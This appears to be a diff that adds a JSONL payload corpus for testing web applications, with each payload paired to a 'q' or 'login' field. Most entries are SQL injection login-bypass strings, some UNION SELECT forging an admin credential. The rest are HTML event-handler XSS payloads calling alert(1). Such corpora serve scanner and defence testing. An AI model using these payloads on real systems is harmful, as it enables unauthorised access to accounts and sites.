@@ -1,0 +1,1054 @@
+{"id": "sqli-01f86083-q", "payload": "'-'", "injection_point": "q", "fragment": true}
+{"id": "sqli-01f86083-login", "payload": "'-'", "injection_point": "login", "fragment": true}
+{"id": "sqli-730d16ce-q", "payload": "' '", "injection_point": "q", "fragment": true}
+{"id": "sqli-730d16ce-login", "payload": "' '", "injection_point": "login", "fragment": true}
+{"id": "sqli-91485dbb-q", "payload": "'&'", "injection_point": "q", "fragment": true}
+{"id": "sqli-91485dbb-login", "payload": "'&'", "injection_point": "login", "fragment": true}
+{"id": "sqli-f7e4e972-q", "payload": "'^'", "injection_point": "q", "fragment": true}
+{"id": "sqli-f7e4e972-login", "payload": "'^'", "injection_point": "login", "fragment": true}
+{"id": "sqli-15a7e30e-q", "payload": "'*'", "injection_point": "q", "fragment": true}
+{"id": "sqli-15a7e30e-login", "payload": "'*'", "injection_point": "login", "fragment": true}
+{"id": "sqli-8da41213-q", "payload": "' or ''-'", "injection_point": "q", "fragment": true}
+{"id": "sqli-8da41213-login", "payload": "' or ''-'", "injection_point": "login", "fragment": true}
+{"id": "sqli-91706853-q", "payload": "' or '' '", "injection_point": "q", "fragment": true}
+{"id": "sqli-91706853-login", "payload": "' or '' '", "injection_point": "login", "fragment": true}
+{"id": "sqli-b0c12141-q", "payload": "' or ''&'", "injection_point": "q", "fragment": true}
+{"id": "sqli-b0c12141-login", "payload": "' or ''&'", "injection_point": "login", "fragment": true}
+{"id": "sqli-2bf1c713-q", "payload": "' or ''^'", "injection_point": "q", "fragment": true}
+{"id": "sqli-2bf1c713-login", "payload": "' or ''^'", "injection_point": "login", "fragment": true}
+{"id": "sqli-daa646a8-q", "payload": "' or ''*'", "injection_point": "q", "fragment": true}
+{"id": "sqli-daa646a8-login", "payload": "' or ''*'", "injection_point": "login", "fragment": true}
+{"id": "sqli-0933fb66-q", "payload": "\"-\"", "injection_point": "q", "fragment": true}
+{"id": "sqli-0933fb66-login", "payload": "\"-\"", "injection_point": "login", "fragment": true}
+{"id": "sqli-52109349-q", "payload": "\" \"", "injection_point": "q", "fragment": true}
+{"id": "sqli-52109349-login", "payload": "\" \"", "injection_point": "login", "fragment": true}
+{"id": "sqli-7f62f3e0-q", "payload": "\"&\"", "injection_point": "q", "fragment": true}
+{"id": "sqli-7f62f3e0-login", "payload": "\"&\"", "injection_point": "login", "fragment": true}
+{"id": "sqli-06acab32-q", "payload": "\"^\"", "injection_point": "q", "fragment": true}
+{"id": "sqli-06acab32-login", "payload": "\"^\"", "injection_point": "login", "fragment": true}
+{"id": "sqli-ed725292-q", "payload": "\"*\"", "injection_point": "q", "fragment": true}
+{"id": "sqli-ed725292-login", "payload": "\"*\"", "injection_point": "login", "fragment": true}
+{"id": "sqli-85738caa-q", "payload": "\" or \"\"-\"", "injection_point": "q", "fragment": true}
+{"id": "sqli-85738caa-login", "payload": "\" or \"\"-\"", "injection_point": "login", "fragment": true}
+{"id": "sqli-eb3ff328-q", "payload": "\" or \"\" \"", "injection_point": "q", "fragment": true}
+{"id": "sqli-eb3ff328-login", "payload": "\" or \"\" \"", "injection_point": "login", "fragment": true}
+{"id": "sqli-57e105b4-q", "payload": "\" or \"\"&\"", "injection_point": "q", "fragment": true}
+{"id": "sqli-57e105b4-login", "payload": "\" or \"\"&\"", "injection_point": "login", "fragment": true}
+{"id": "sqli-1c13e2dc-q", "payload": "\" or \"\"^\"", "injection_point": "q", "fragment": true}
+{"id": "sqli-1c13e2dc-login", "payload": "\" or \"\"^\"", "injection_point": "login", "fragment": true}
+{"id": "sqli-07a2ed1e-q", "payload": "\" or \"\"*\"", "injection_point": "q", "fragment": true}
+{"id": "sqli-07a2ed1e-login", "payload": "\" or \"\"*\"", "injection_point": "login", "fragment": true}
+{"id": "sqli-925997bb-q", "payload": "or true--", "injection_point": "q", "fragment": false}
+{"id": "sqli-925997bb-login", "payload": "or true--", "injection_point": "login", "fragment": false}
+{"id": "sqli-1e018b13-q", "payload": "\" or true--", "injection_point": "q", "fragment": false}
+{"id": "sqli-1e018b13-login", "payload": "\" or true--", "injection_point": "login", "fragment": false}
+{"id": "sqli-b33dd8e9-q", "payload": "' or true--", "injection_point": "q", "fragment": false}
+{"id": "sqli-b33dd8e9-login", "payload": "' or true--", "injection_point": "login", "fragment": false}
+{"id": "sqli-cba0a4a7-q", "payload": "\") or true--", "injection_point": "q", "fragment": false}
+{"id": "sqli-cba0a4a7-login", "payload": "\") or true--", "injection_point": "login", "fragment": false}
+{"id": "sqli-ee9c0ef9-q", "payload": "') or true--", "injection_point": "q", "fragment": false}
+{"id": "sqli-ee9c0ef9-login", "payload": "') or true--", "injection_point": "login", "fragment": false}
+{"id": "sqli-d5e8c63e-q", "payload": "' or 'x'='x", "injection_point": "q", "fragment": false}
+{"id": "sqli-d5e8c63e-login", "payload": "' or 'x'='x", "injection_point": "login", "fragment": false}
+{"id": "sqli-e0ed04bd-q", "payload": "') or ('x')=('x", "injection_point": "q", "fragment": false}
+{"id": "sqli-e0ed04bd-login", "payload": "') or ('x')=('x", "injection_point": "login", "fragment": false}
+{"id": "sqli-43c36ec3-q", "payload": "')) or (('x'))=(('x", "injection_point": "q", "fragment": false}
+{"id": "sqli-43c36ec3-login", "payload": "')) or (('x'))=(('x", "injection_point": "login", "fragment": false}
+{"id": "sqli-382abb8b-q", "payload": "\" or \"x\"=\"x", "injection_point": "q", "fragment": false}
+{"id": "sqli-382abb8b-login", "payload": "\" or \"x\"=\"x", "injection_point": "login", "fragment": false}
+{"id": "sqli-0ee59083-q", "payload": "\") or (\"x\")=(\"x", "injection_point": "q", "fragment": false}
+{"id": "sqli-0ee59083-login", "payload": "\") or (\"x\")=(\"x", "injection_point": "login", "fragment": false}
+{"id": "sqli-fb72118c-q", "payload": "\")) or ((\"x\"))=((\"x", "injection_point": "q", "fragment": false}
+{"id": "sqli-fb72118c-login", "payload": "\")) or ((\"x\"))=((\"x", "injection_point": "login", "fragment": false}
+{"id": "sqli-5109f356-q", "payload": "or 1=1", "injection_point": "q", "fragment": false}
+{"id": "sqli-5109f356-login", "payload": "or 1=1", "injection_point": "login", "fragment": false}
+{"id": "sqli-304cb2e9-q", "payload": "or 1=1-- ", "injection_point": "q", "fragment": false}
+{"id": "sqli-304cb2e9-login", "payload": "or 1=1-- ", "injection_point": "login", "fragment": false}
+{"id": "sqli-d36d86d7-q", "payload": "or 1=1#", "injection_point": "q", "fragment": false}
+{"id": "sqli-d36d86d7-login", "payload": "or 1=1#", "injection_point": "login", "fragment": false}
+{"id": "sqli-eb4fafe8-q", "payload": "or 1=1/*", "injection_point": "q", "fragment": false}
+{"id": "sqli-eb4fafe8-login", "payload": "or 1=1/*", "injection_point": "login", "fragment": false}
+{"id": "sqli-ef11b83d-q", "payload": "admin' --", "injection_point": "q", "fragment": true}
+{"id": "sqli-ef11b83d-login", "payload": "admin' --", "injection_point": "login", "fragment": true}
+{"id": "sqli-28ff8771-q", "payload": "admin' #", "injection_point": "q", "fragment": true}
+{"id": "sqli-28ff8771-login", "payload": "admin' #", "injection_point": "login", "fragment": true}
+{"id": "sqli-8ac6dee6-q", "payload": "admin'/*", "injection_point": "q", "fragment": true}
+{"id": "sqli-8ac6dee6-login", "payload": "admin'/*", "injection_point": "login", "fragment": true}
+{"id": "sqli-43319db8-q", "payload": "admin' or '1'='1", "injection_point": "q", "fragment": false}
+{"id": "sqli-43319db8-login", "payload": "admin' or '1'='1", "injection_point": "login", "fragment": false}
+{"id": "sqli-4cab31b0-q", "payload": "admin' or '1'='1'--", "injection_point": "q", "fragment": false}
+{"id": "sqli-4cab31b0-login", "payload": "admin' or '1'='1'--", "injection_point": "login", "fragment": false}
+{"id": "sqli-59730505-q", "payload": "admin' or '1'='1'#", "injection_point": "q", "fragment": false}
+{"id": "sqli-59730505-login", "payload": "admin' or '1'='1'#", "injection_point": "login", "fragment": false}
+{"id": "sqli-eaaf5ffe-q", "payload": "admin' or '1'='1'/*", "injection_point": "q", "fragment": false}
+{"id": "sqli-eaaf5ffe-login", "payload": "admin' or '1'='1'/*", "injection_point": "login", "fragment": false}
+{"id": "sqli-9da50fbb-q", "payload": "admin'or 1=1 or ''='", "injection_point": "q", "fragment": false}
+{"id": "sqli-9da50fbb-login", "payload": "admin'or 1=1 or ''='", "injection_point": "login", "fragment": false}
+{"id": "sqli-087af73e-q", "payload": "admin' or 1=1", "injection_point": "q", "fragment": false}
+{"id": "sqli-087af73e-login", "payload": "admin' or 1=1", "injection_point": "login", "fragment": false}
+{"id": "sqli-0c0a9d6b-q", "payload": "admin' or 1=1--", "injection_point": "q", "fragment": false}
+{"id": "sqli-0c0a9d6b-login", "payload": "admin' or 1=1--", "injection_point": "login", "fragment": false}
+{"id": "sqli-eb04843f-q", "payload": "admin' or 1=1#", "injection_point": "q", "fragment": false}
+{"id": "sqli-eb04843f-login", "payload": "admin' or 1=1#", "injection_point": "login", "fragment": false}
+{"id": "sqli-f01dcc76-q", "payload": "admin' or 1=1/*", "injection_point": "q", "fragment": false}
+{"id": "sqli-f01dcc76-login", "payload": "admin' or 1=1/*", "injection_point": "login", "fragment": false}
+{"id": "sqli-546a50b0-q", "payload": "admin') or ('1'='1", "injection_point": "q", "fragment": false}
+{"id": "sqli-546a50b0-login", "payload": "admin') or ('1'='1", "injection_point": "login", "fragment": false}
+{"id": "sqli-2efece91-q", "payload": "admin') or ('1'='1'--", "injection_point": "q", "fragment": false}
+{"id": "sqli-2efece91-login", "payload": "admin') or ('1'='1'--", "injection_point": "login", "fragment": false}
+{"id": "sqli-338068f1-q", "payload": "admin') or ('1'='1'#", "injection_point": "q", "fragment": false}
+{"id": "sqli-338068f1-login", "payload": "admin') or ('1'='1'#", "injection_point": "login", "fragment": false}
+{"id": "sqli-fc1121b9-q", "payload": "admin') or ('1'='1'/*", "injection_point": "q", "fragment": false}
+{"id": "sqli-fc1121b9-login", "payload": "admin') or ('1'='1'/*", "injection_point": "login", "fragment": false}
+{"id": "sqli-2e454259-q", "payload": "admin') or '1'='1", "injection_point": "q", "fragment": false}
+{"id": "sqli-2e454259-login", "payload": "admin') or '1'='1", "injection_point": "login", "fragment": false}
+{"id": "sqli-cd3b28b4-q", "payload": "admin') or '1'='1'--", "injection_point": "q", "fragment": false}
+{"id": "sqli-cd3b28b4-login", "payload": "admin') or '1'='1'--", "injection_point": "login", "fragment": false}
+{"id": "sqli-29b1b8df-q", "payload": "admin') or '1'='1'#", "injection_point": "q", "fragment": false}
+{"id": "sqli-29b1b8df-login", "payload": "admin') or '1'='1'#", "injection_point": "login", "fragment": false}
+{"id": "sqli-bd5671f5-q", "payload": "admin') or '1'='1'/*", "injection_point": "q", "fragment": false}
+{"id": "sqli-bd5671f5-login", "payload": "admin') or '1'='1'/*", "injection_point": "login", "fragment": false}
+{"id": "sqli-d26c64e1-q", "payload": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", "injection_point": "q", "fragment": false}
+{"id": "sqli-d26c64e1-login", "payload": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", "injection_point": "login", "fragment": false}
+{"id": "sqli-27f94926-q", "payload": "admin\" --", "injection_point": "q", "fragment": true}
+{"id": "sqli-27f94926-login", "payload": "admin\" --", "injection_point": "login", "fragment": true}
+{"id": "sqli-cccf5e58-q", "payload": "admin\" #", "injection_point": "q", "fragment": true}
+{"id": "sqli-cccf5e58-login", "payload": "admin\" #", "injection_point": "login", "fragment": true}
+{"id": "sqli-beca71f8-q", "payload": "admin\"/*", "injection_point": "q", "fragment": true}
+{"id": "sqli-beca71f8-login", "payload": "admin\"/*", "injection_point": "login", "fragment": true}
+{"id": "sqli-a77cd69b-q", "payload": "admin\" or \"1\"=\"1", "injection_point": "q", "fragment": false}
+{"id": "sqli-a77cd69b-login", "payload": "admin\" or \"1\"=\"1", "injection_point": "login", "fragment": false}
+{"id": "sqli-1db92de8-q", "payload": "admin\" or \"1\"=\"1\"--", "injection_point": "q", "fragment": false}
+{"id": "sqli-1db92de8-login", "payload": "admin\" or \"1\"=\"1\"--", "injection_point": "login", "fragment": false}
+{"id": "sqli-6e47f23b-q", "payload": "admin\" or \"1\"=\"1\"#", "injection_point": "q", "fragment": false}
+{"id": "sqli-6e47f23b-login", "payload": "admin\" or \"1\"=\"1\"#", "injection_point": "login", "fragment": false}
+{"id": "sqli-f0b4d8ab-q", "payload": "admin\" or \"1\"=\"1\"/*", "injection_point": "q", "fragment": false}
+{"id": "sqli-f0b4d8ab-login", "payload": "admin\" or \"1\"=\"1\"/*", "injection_point": "login", "fragment": false}
+{"id": "sqli-ef753d10-q", "payload": "admin\"or 1=1 or \"\"=\"", "injection_point": "q", "fragment": false}
+{"id": "sqli-ef753d10-login", "payload": "admin\"or 1=1 or \"\"=\"", "injection_point": "login", "fragment": false}
+{"id": "sqli-0c1567f5-q", "payload": "admin\" or 1=1", "injection_point": "q", "fragment": false}
+{"id": "sqli-0c1567f5-login", "payload": "admin\" or 1=1", "injection_point": "login", "fragment": false}
+{"id": "sqli-bd571692-q", "payload": "admin\" or 1=1--", "injection_point": "q", "fragment": false}
+{"id": "sqli-bd571692-login", "payload": "admin\" or 1=1--", "injection_point": "login", "fragment": false}
+{"id": "sqli-ebf229cf-q", "payload": "admin\" or 1=1#", "injection_point": "q", "fragment": false}
+{"id": "sqli-ebf229cf-login", "payload": "admin\" or 1=1#", "injection_point": "login", "fragment": false}
+{"id": "sqli-1d273014-q", "payload": "admin\" or 1=1/*", "injection_point": "q", "fragment": false}
+{"id": "sqli-1d273014-login", "payload": "admin\" or 1=1/*", "injection_point": "login", "fragment": false}
+{"id": "sqli-a2035700-q", "payload": "admin\") or (\"1\"=\"1", "injection_point": "q", "fragment": false}
+{"id": "sqli-a2035700-login", "payload": "admin\") or (\"1\"=\"1", "injection_point": "login", "fragment": false}
+{"id": "sqli-32d32940-q", "payload": "admin\") or (\"1\"=\"1\"--", "injection_point": "q", "fragment": false}
+{"id": "sqli-32d32940-login", "payload": "admin\") or (\"1\"=\"1\"--", "injection_point": "login", "fragment": false}
+{"id": "sqli-c6072953-q", "payload": "admin\") or (\"1\"=\"1\"#", "injection_point": "q", "fragment": false}
+{"id": "sqli-c6072953-login", "payload": "admin\") or (\"1\"=\"1\"#", "injection_point": "login", "fragment": false}
+{"id": "sqli-bde4f6b2-q", "payload": "admin\") or (\"1\"=\"1\"/*", "injection_point": "q", "fragment": false}
+{"id": "sqli-bde4f6b2-login", "payload": "admin\") or (\"1\"=\"1\"/*", "injection_point": "login", "fragment": false}
+{"id": "sqli-180d12ba-q", "payload": "admin\") or \"1\"=\"1", "injection_point": "q", "fragment": false}
+{"id": "sqli-180d12ba-login", "payload": "admin\") or \"1\"=\"1", "injection_point": "login", "fragment": false}
+{"id": "sqli-c9fe3605-q", "payload": "admin\") or \"1\"=\"1\"--", "injection_point": "q", "fragment": false}
+{"id": "sqli-c9fe3605-login", "payload": "admin\") or \"1\"=\"1\"--", "injection_point": "login", "fragment": false}
+{"id": "sqli-8c187a93-q", "payload": "admin\") or \"1\"=\"1\"#", "injection_point": "q", "fragment": false}
+{"id": "sqli-8c187a93-login", "payload": "admin\") or \"1\"=\"1\"#", "injection_point": "login", "fragment": false}
+{"id": "sqli-906b8603-q", "payload": "admin\") or \"1\"=\"1\"/*", "injection_point": "q", "fragment": false}
+{"id": "sqli-906b8603-login", "payload": "admin\") or \"1\"=\"1\"/*", "injection_point": "login", "fragment": false}
+{"id": "sqli-0242727b-q", "payload": "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055", "injection_point": "q", "fragment": false}
+{"id": "sqli-0242727b-login", "payload": "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055", "injection_point": "login", "fragment": false}
+{"id": "xss-7f4d1894-q", "payload": "<a id=x tabindex=1 onfocus=alert(1)></a>", "injection_point": "q", "fragment": false}
+{"id": "xss-7f4d1894-login", "payload": "<a id=x tabindex=1 onfocus=alert(1)></a>", "injection_point": "login", "fragment": false}
+{"id": "xss-f0c0732b-q", "payload": "<address ondblclick=\"alert(1)\">test</address>", "injection_point": "q", "fragment": false}
+{"id": "xss-f0c0732b-login", "payload": "<address ondblclick=\"alert(1)\">test</address>", "injection_point": "login", "fragment": false}
+{"id": "xss-f1accc6d-q", "payload": "<applet draggable=\"true\" ondragstart=\"alert(1)\">test</applet>", "injection_point": "q", "fragment": false}
+{"id": "xss-f1accc6d-login", "payload": "<applet draggable=\"true\" ondragstart=\"alert(1)\">test</applet>", "injection_point": "login", "fragment": false}
+{"id": "xss-d4e13aed-q", "payload": "<audio id=x controls onfocusin=alert(1) id=x><source src=\"validaudio.wav\"></audio>", "injection_point": "q", "fragment": false}
+{"id": "xss-d4e13aed-login", "payload": "<audio id=x controls onfocusin=alert(1) id=x><source src=\"validaudio.wav\"></audio>", "injection_point": "login", "fragment": false}
+{"id": "xss-b96414cd-q", "payload": "<b oncopy=\"alert(1)\" contenteditable>test</b>", "injection_point": "q", "fragment": false}
+{"id": "xss-b96414cd-login", "payload": "<b oncopy=\"alert(1)\" contenteditable>test</b>", "injection_point": "login", "fragment": false}
+{"id": "xss-cdfc822b-q", "payload": "<base draggable=\"true\" ondrag=\"alert(1)\">test</base>", "injection_point": "q", "fragment": false}
+{"id": "xss-cdfc822b-login", "payload": "<base draggable=\"true\" ondrag=\"alert(1)\">test</base>", "injection_point": "login", "fragment": false}
+{"id": "xss-86175abd-q", "payload": "<big ondblclick=\"alert(1)\">test</big>", "injection_point": "q", "fragment": false}
+{"id": "xss-86175abd-login", "payload": "<big ondblclick=\"alert(1)\">test</big>", "injection_point": "login", "fragment": false}
+{"id": "xss-80ef8944-q", "payload": "<big onmousedown=\"alert(1)\">test</big>", "injection_point": "q", "fragment": false}
+{"id": "xss-80ef8944-login", "payload": "<big onmousedown=\"alert(1)\">test</big>", "injection_point": "login", "fragment": false}
+{"id": "xss-592b0302-q", "payload": "<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>", "injection_point": "q", "fragment": false}
+{"id": "xss-592b0302-login", "payload": "<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>", "injection_point": "login", "fragment": false}
+{"id": "xss-d1a21513-q", "payload": "<body onblur=alert(1) id=x><iframe id=x>", "injection_point": "q", "fragment": false}
+{"id": "xss-d1a21513-login", "payload": "<body onblur=alert(1) id=x><iframe id=x>", "injection_point": "login", "fragment": false}
+{"id": "xss-8663ea87-q", "payload": "<br onmouseenter=\"alert(1)\">test</br>", "injection_point": "q", "fragment": false}
+{"id": "xss-8663ea87-login", "payload": "<br onmouseenter=\"alert(1)\">test</br>", "injection_point": "login", "fragment": false}
+{"id": "xss-eab727ef-q", "payload": "<br onmousemove=\"alert(1)\">test</br>", "injection_point": "q", "fragment": false}
+{"id": "xss-eab727ef-login", "payload": "<br onmousemove=\"alert(1)\">test</br>", "injection_point": "login", "fragment": false}
+{"id": "xss-91619a9c-q", "payload": "<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>", "injection_point": "q", "fragment": false}
+{"id": "xss-91619a9c-login", "payload": "<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>", "injection_point": "login", "fragment": false}
+{"id": "xss-d2afb95b-q", "payload": "<caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>", "injection_point": "q", "fragment": false}
+{"id": "xss-d2afb95b-login", "payload": "<caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>", "injection_point": "login", "fragment": false}
+{"id": "xss-ff482ddc-q", "payload": "<caption ondblclick=\"alert(1)\">test</caption>", "injection_point": "q", "fragment": false}
+{"id": "xss-ff482ddc-login", "payload": "<caption ondblclick=\"alert(1)\">test</caption>", "injection_point": "login", "fragment": false}
+{"id": "xss-d3134f8d-q", "payload": "<caption onkeypress=\"alert(1)\" contenteditable>test</caption>", "injection_point": "q", "fragment": false}
+{"id": "xss-d3134f8d-login", "payload": "<caption onkeypress=\"alert(1)\" contenteditable>test</caption>", "injection_point": "login", "fragment": false}
+{"id": "xss-3e687de5-q", "payload": "<center draggable=\"true\" ondragstart=\"alert(1)\">test</center>", "injection_point": "q", "fragment": false}
+{"id": "xss-3e687de5-login", "payload": "<center draggable=\"true\" ondragstart=\"alert(1)\">test</center>", "injection_point": "login", "fragment": false}
+{"id": "xss-278f59ea-q", "payload": "<center oncontextmenu=\"alert(1)\">test</center>", "injection_point": "q", "fragment": false}
+{"id": "xss-278f59ea-login", "payload": "<center oncontextmenu=\"alert(1)\">test</center>", "injection_point": "login", "fragment": false}
+{"id": "xss-57ccd0f3-q", "payload": "<cite oncopy=\"alert(1)\" contenteditable>test</cite>", "injection_point": "q", "fragment": false}
+{"id": "xss-57ccd0f3-login", "payload": "<cite oncopy=\"alert(1)\" contenteditable>test</cite>", "injection_point": "login", "fragment": false}
+{"id": "xss-6a803568-q", "payload": "<code draggable=\"true\" ondrag=\"alert(1)\">test</code>", "injection_point": "q", "fragment": false}
+{"id": "xss-6a803568-login", "payload": "<code draggable=\"true\" ondrag=\"alert(1)\">test</code>", "injection_point": "login", "fragment": false}
+{"id": "xss-cbb95965-q", "payload": "<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>", "injection_point": "q", "fragment": false}
+{"id": "xss-cbb95965-login", "payload": "<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>", "injection_point": "login", "fragment": false}
+{"id": "xss-aebc9837-q", "payload": "<command onmousedown=\"alert(1)\">test</command>", "injection_point": "q", "fragment": false}
+{"id": "xss-aebc9837-login", "payload": "<command onmousedown=\"alert(1)\">test</command>", "injection_point": "login", "fragment": false}
+{"id": "xss-b42ad76d-q", "payload": "<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>", "injection_point": "q", "fragment": false}
+{"id": "xss-b42ad76d-login", "payload": "<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>", "injection_point": "login", "fragment": false}
+{"id": "xss-93e4a741-q", "payload": "<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>", "injection_point": "q", "fragment": false}
+{"id": "xss-93e4a741-login", "payload": "<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>", "injection_point": "login", "fragment": false}
+{"id": "xss-7569dc90-q", "payload": "<dd oncut=\"alert(1)\" contenteditable>test</dd>", "injection_point": "q", "fragment": false}
+{"id": "xss-7569dc90-login", "payload": "<dd oncut=\"alert(1)\" contenteditable>test</dd>", "injection_point": "login", "fragment": false}
+{"id": "xss-cc8ef211-q", "payload": "<details onmouseout=\"alert(1)\">test</details>", "injection_point": "q", "fragment": false}
+{"id": "xss-cc8ef211-login", "payload": "<details onmouseout=\"alert(1)\">test</details>", "injection_point": "login", "fragment": false}
+{"id": "xss-8be5f253-q", "payload": "<details ontoggle=alert(1) open>test</details>", "injection_point": "q", "fragment": false}
+{"id": "xss-8be5f253-login", "payload": "<details ontoggle=alert(1) open>test</details>", "injection_point": "login", "fragment": false}
+{"id": "xss-a9cff41f-q", "payload": "<dfn onkeypress=\"alert(1)\" contenteditable>test</dfn>", "injection_point": "q", "fragment": false}
+{"id": "xss-a9cff41f-login", "payload": "<dfn onkeypress=\"alert(1)\" contenteditable>test</dfn>", "injection_point": "login", "fragment": false}
+{"id": "xss-21b186ed-q", "payload": "<dialog onmouseleave=\"alert(1)\">test</dialog>", "injection_point": "q", "fragment": false}
+{"id": "xss-21b186ed-login", "payload": "<dialog onmouseleave=\"alert(1)\">test</dialog>", "injection_point": "login", "fragment": false}
+{"id": "xss-e83460a7-q", "payload": "<dir oncontextmenu=\"alert(1)\">test</dir>", "injection_point": "q", "fragment": false}
+{"id": "xss-e83460a7-login", "payload": "<dir oncontextmenu=\"alert(1)\">test</dir>", "injection_point": "login", "fragment": false}
+{"id": "xss-c067b172-q", "payload": "<div draggable=\"true\" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>", "injection_point": "q", "fragment": false}
+{"id": "xss-c067b172-login", "payload": "<div draggable=\"true\" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>", "injection_point": "login", "fragment": false}
+{"id": "xss-d1e93037-q", "payload": "<div draggable=\"true\" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable>drop here</tr>", "injection_point": "q", "fragment": false}
+{"id": "xss-d1e93037-login", "payload": "<div draggable=\"true\" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable>drop here</tr>", "injection_point": "login", "fragment": false}
+{"id": "xss-29a20782-q", "payload": "<div id=x tabindex=1 onbeforeactivate=alert(1)></div>", "injection_point": "q", "fragment": false}
+{"id": "xss-29a20782-login", "payload": "<div id=x tabindex=1 onbeforeactivate=alert(1)></div>", "injection_point": "login", "fragment": false}
+{"id": "xss-9983a0d9-q", "payload": "<div onmouseout=\"alert(1)\">test</div>", "injection_point": "q", "fragment": false}
+{"id": "xss-9983a0d9-login", "payload": "<div onmouseout=\"alert(1)\">test</div>", "injection_point": "login", "fragment": false}
+{"id": "xss-de71d05a-q", "payload": "<dl draggable=\"true\" ondragstart=\"alert(1)\">test</dl>", "injection_point": "q", "fragment": false}
+{"id": "xss-de71d05a-login", "payload": "<dl draggable=\"true\" ondragstart=\"alert(1)\">test</dl>", "injection_point": "login", "fragment": false}
+{"id": "xss-4480b291-q", "payload": "<dl id=x tabindex=1 onfocusin=alert(1)></dl>", "injection_point": "q", "fragment": false}
+{"id": "xss-4480b291-login", "payload": "<dl id=x tabindex=1 onfocusin=alert(1)></dl>", "injection_point": "login", "fragment": false}
+{"id": "xss-3a3f12a6-q", "payload": "<em onbeforepaste=\"alert(1)\" contenteditable>test</em>", "injection_point": "q", "fragment": false}
+{"id": "xss-3a3f12a6-login", "payload": "<em onbeforepaste=\"alert(1)\" contenteditable>test</em>", "injection_point": "login", "fragment": false}
+{"id": "xss-90e4fc28-q", "payload": "<em onmousedown=\"alert(1)\">test</em>", "injection_point": "q", "fragment": false}
+{"id": "xss-90e4fc28-login", "payload": "<em onmousedown=\"alert(1)\">test</em>", "injection_point": "login", "fragment": false}
+{"id": "xss-b6e82b95-q", "payload": "<figcaption onbeforepaste=\"alert(1)\" contenteditable>test</figcaption>", "injection_point": "q", "fragment": false}
+{"id": "xss-b6e82b95-login", "payload": "<figcaption onbeforepaste=\"alert(1)\" contenteditable>test</figcaption>", "injection_point": "login", "fragment": false}
+{"id": "xss-f87bb641-q", "payload": "<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>", "injection_point": "q", "fragment": false}
+{"id": "xss-f87bb641-login", "payload": "<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>", "injection_point": "login", "fragment": false}
+{"id": "xss-a60ebce8-q", "payload": "<figure onmouseenter=\"alert(1)\">test</figure>", "injection_point": "q", "fragment": false}
+{"id": "xss-a60ebce8-login", "payload": "<figure onmouseenter=\"alert(1)\">test</figure>", "injection_point": "login", "fragment": false}
+{"id": "xss-2a3cdb17-q", "payload": "<font draggable=\"true\" ondragleave=\"alert(1)\">test</font>", "injection_point": "q", "fragment": false}
+{"id": "xss-2a3cdb17-login", "payload": "<font draggable=\"true\" ondragleave=\"alert(1)\">test</font>", "injection_point": "login", "fragment": false}
+{"id": "xss-1ad3ebcb-q", "payload": "<frame oncopy=\"alert(1)\" contenteditable>test</frame>", "injection_point": "q", "fragment": false}
+{"id": "xss-1ad3ebcb-login", "payload": "<frame oncopy=\"alert(1)\" contenteditable>test</frame>", "injection_point": "login", "fragment": false}
+{"id": "xss-5306eb06-q", "payload": "<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>", "injection_point": "q", "fragment": false}
+{"id": "xss-5306eb06-login", "payload": "<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>", "injection_point": "login", "fragment": false}
+{"id": "xss-7de0a002-q", "payload": "<h1 draggable=\"true\" ondragleave=\"alert(1)\">test</h1>", "injection_point": "q", "fragment": false}
+{"id": "xss-7de0a002-login", "payload": "<h1 draggable=\"true\" ondragleave=\"alert(1)\">test</h1>", "injection_point": "login", "fragment": false}
+{"id": "xss-a714c5ce-q", "payload": "<h1 id=x tabindex=1 onfocusin=alert(1)></h1>", "injection_point": "q", "fragment": false}
+{"id": "xss-a714c5ce-login", "payload": "<h1 id=x tabindex=1 onfocusin=alert(1)></h1>", "injection_point": "login", "fragment": false}
+{"id": "xss-0e29f8fb-q", "payload": "<h1 oncut=\"alert(1)\" contenteditable>test</h1>", "injection_point": "q", "fragment": false}
+{"id": "xss-0e29f8fb-login", "payload": "<h1 oncut=\"alert(1)\" contenteditable>test</h1>", "injection_point": "login", "fragment": false}
+{"id": "xss-ffb57ed3-q", "payload": "<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>", "injection_point": "q", "fragment": false}
+{"id": "xss-ffb57ed3-login", "payload": "<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>", "injection_point": "login", "fragment": false}
+{"id": "xss-d8382dde-q", "payload": "<hr onbeforepaste=\"alert(1)\" contenteditable>test</hr>", "injection_point": "q", "fragment": false}
+{"id": "xss-d8382dde-login", "payload": "<hr onbeforepaste=\"alert(1)\" contenteditable>test</hr>", "injection_point": "login", "fragment": false}
+{"id": "xss-502e9e4b-q", "payload": "<hr onkeypress=\"alert(1)\" contenteditable>test</hr>", "injection_point": "q", "fragment": false}
+{"id": "xss-502e9e4b-login", "payload": "<hr onkeypress=\"alert(1)\" contenteditable>test</hr>", "injection_point": "login", "fragment": false}
